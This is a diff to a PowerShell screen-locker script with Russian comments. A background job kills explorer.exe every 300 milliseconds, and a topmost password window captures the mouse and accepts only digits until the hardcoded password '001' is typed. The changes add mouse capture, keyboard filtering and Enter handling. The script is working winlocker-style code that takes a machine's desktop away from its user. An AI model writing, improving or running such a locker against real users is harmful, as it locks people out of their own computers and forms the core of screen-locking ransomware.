@@ -1,21 +1,18 @@
 Add-Type -AssemblyName PresentationFramework
 [void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 
-# Переменная-флаг для контроля состояния блокировки
 $global:Unlocked = $false
 
-# Функция для постоянного подавления Explorer в фоновом потоке
+# Фоновый поток для принудительного закрытия Explorer
 $BlockExplorerJob = {
     while ($true) {
         $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
         if ($explorer) {
             Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
         }
-        Start-Sleep -Milliseconds 300 # Частота проверки, чтобы ОС не успела прогрузить рабочий стол
+        Start-Sleep -Milliseconds 300
     }
 }
-
-# Запуск фонового процесса блокировки Explorer
 $job = Start-Job -ScriptBlock $BlockExplorerJob
 
 function Show-PasswordWindow {
@@ -27,6 +24,9 @@ function Show-PasswordWindow {
     $form.MaximizeBox = $false
     $form.MinimizeBox = $false
     $form.TopMost = $true 
+
+    # Отключаем реакцию формы на любые клики мыши за пределами элементов управления
+    $form.Capture = $true
 
     $label = New-Object System.Windows.Forms.Label
     $label.Location = New-Object System.Drawing.Point(20, 20)
@@ -46,7 +46,11 @@ function Show-PasswordWindow {
     $button.Text = "Unlock"
     $form.Controls.Add($button)
 
-    $button.Add_Click({
+    # Делаем кнопку Unlock кнопкой по умолчанию для клавиши Enter на форме
+    $form.AcceptButton = $button
+
+    # Логика проверки пароля
+    $UnlockAction = {
         if ($textBox.Text -eq "001") {
             $global:Unlocked = $true
             $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
@@ -55,6 +59,32 @@ function Show-PasswordWindow {
             [System.Windows.Forms.MessageBox]::Show("Incorrect password!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
             $textBox.Clear()
             $textBox.Focus()
+        }
+    }
+
+    # Клик по кнопке вызывает проверку
+    $button.Add_Click($UnlockAction)
+
+    # БЛОКИРОВКА КЛАВИАТУРЫ: Разрешаем вводить только цифры и обрабатывать Enter
+    $textBox.Add_KeyPress({
+        param($_, $e)
+        # Получаем ASCII код нажатой клавиши
+        $char = $e.KeyChar
+        
+        # Разрешаем: Цифры (от '0' до '9') и Enter (код 13)
+        # Если это не они — отменяем ввод (Handled = $true)
+        if (-not (($char -ge '0' -and $char -le '9') -or $char -eq [char]13)) {
+            $e.Handled = $true
+        }
+    })
+
+    # Дополнительный перехват клавиши Enter непосредственно внутри текстового поля
+    $textBox.Add_KeyDown({
+        param($_, $e)
+        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
+            & $UnlockAction
+            $e.Handled = $true
+            $e.SuppressKeyPress = $true
         }
     })
 
@@ -66,13 +96,14 @@ function Show-PasswordWindow {
         }
     })
 
+    # Автофокус на поле ввода при открытии, чтобы пользователю не нужно было кликать мышкой
+    $form.Add_Shown({ $textBox.Focus() })
+
     $form.ShowDialog() | Out-Null
 }
 
-# Отображаем окно авторизации
 Show-PasswordWindow
 
-# Если пароль верный — останавливаем фоновый убийца процессов и запускаем Explorer
 if ($global:Unlocked -eq $true) {
     Stop-Job $job
     Remove-Job $job
